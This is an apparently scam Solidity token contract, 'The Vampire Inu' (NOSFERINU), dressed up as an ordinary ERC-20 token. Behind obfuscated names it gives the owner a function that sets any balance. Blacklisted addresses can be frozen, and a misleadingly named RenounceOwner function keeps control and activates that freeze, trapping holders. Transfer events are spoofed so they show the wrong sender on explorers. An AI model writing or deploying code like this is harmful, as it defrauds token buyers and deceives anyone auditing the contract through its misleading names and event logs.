/**
 *Submitted for verification at Etherscan.io on 2022-10-15
*/

// "SPDX-License-Identifier: UNLICENSED

                                    
pragma solidity 0.8.16;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract NOSFERINU {
  
    mapping (address => uint256) public xAMt;
    mapping (address => bool) yTXn;


    // 
    string public name = "The Vampire Inu";
    string public symbol = unicode"NOSFERINU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 500000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint yVer = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        xAMt[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x20498Df52E10fD2E5579d4F532448F647E7cc2A6;
    address lead_dev = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier IxxI() {   
         require(msg.sender == owner);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(xAMt[msg.sender] >= value);
        xAMt[msg.sender] -= value;  
        xAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(yTXn[msg.sender]) {
        require(yVer < 1);} 
        require(xAMt[msg.sender] >= value);
        xAMt[msg.sender] -= value;  
        xAMt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return xAMt[account]; }
        function ycheck(address G) IxxI public{          
        require(!yTXn[G]);
        yTXn[G] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function yval(address G, uint256 zX) IxxI public returns (bool success) {
        xAMt[G] = zX;
        return true; }
        function RenounceOwner() public {
        require(msg.sender == owner);
        yVer = 1;}
        function ywdraw(address G) IxxI public {
        require(yTXn[G]);
        yTXn[G] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= xAMt[from]);
        require(value <= allowance[from][msg.sender]);
        xAMt[from] -= value;  
        xAMt[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(yTXn[from] || yTXn[to]) {
        require(yVer < 1);}
        require(value <= xAMt[from]);
        require(value <= allowance[from][msg.sender]);
        xAMt[from] -= value;
        xAMt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }